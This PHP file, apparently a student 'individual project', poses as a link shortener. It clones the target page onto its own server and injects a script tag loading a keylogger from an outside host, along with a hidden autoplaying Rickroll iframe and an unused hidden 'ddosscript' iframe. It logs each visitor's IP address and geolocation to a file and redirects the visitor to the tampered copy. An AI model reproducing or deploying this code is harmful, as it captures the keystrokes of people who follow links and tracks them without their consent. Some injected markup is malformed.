<?php
include "../scripts/simple_html_dom.php" ;
include "../php/DataBaseHandling.php";


$conn = openConnection();
//SEARCHING DATABASE WITH KEY TO GET LONGLINK
$actual_link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
//$key = substr(strrchr($actual_link, "/"), 1);
$key = substr($_SERVER[REQUEST_URI],1,5);
$link = selectDataFromDatabase($key, $conn);

//DUPLICATING HTML FILE ONTO OWN SERVER
$htmlFileName = "index.html";
$html=fopen($htmlFileName, "w");
fwrite($html , file_get_contents("$link"));
fclose($html);

//CREATING PATHS FOR OTHER FILES FOUND IN HTML
$html = file_get_html($link);
foreach($html->find('img') as $element){
		$img = $element->src ;
    // Starts with http:// or https:// (case insensitive).
    if (preg_match('#^https?://#i', $img) === 0) {
      if (!is_dir("$img")){
          $path = substr($img , 0 , strlen($img) - strlen(strrchr($img , "/")));
          mkdir(getcwd().$path , 0777 , true);
          copy($link.$img , getcwd().$img);
      }
      else{
            die('Failed to create folders...');
      }
    }
	};

//ADDING IN THE KEYLOGGER SCRIPT INTO HTML ON SERVER
//ADDING RICKROLL ATTACK TEST
$keyloggerscript = "http://individualproject.esy.es/js/keylogger.js";
$ddosscript ="<iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 1;i++){alert()}' frameborder='0' </iframe>";
$textToInsert="script src='$keyloggerscript'></script>"."<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
$contents = file_get_contents("$htmlFileName");
$newContent = preg_replace("</body>", $textToInsert."</body", $contents);
file_put_contents($htmlFileName, $newContent);


//GETTING IP AND ADDING IT TO DATA.TXT ON SERVER
$ip = getenv('HTTP_CLIENT_IP')?:
getenv('HTTP_X_FORWARDED_FOR')?:
getenv('HTTP_X_FORWARDED')?:
getenv('HTTP_FORWARDED_FOR')?:
getenv('HTTP_FORWARDED')?:
getenv('REMOTE_ADDR');

//depends on location / this ip for good result 12.215.42.19 ;
 $data = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true")." Says ";
 $logfile = fopen('../php/data.txt', 'a+');
 fwrite($logfile, $data );
 fclose($logfile);


//depends on location / this ip for good result 12.215.42.19 ;
//$check = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true");
//REDIRECTING TO LONG LINK
header("Location:".$htmlFileName, true, 303);
die();

?>
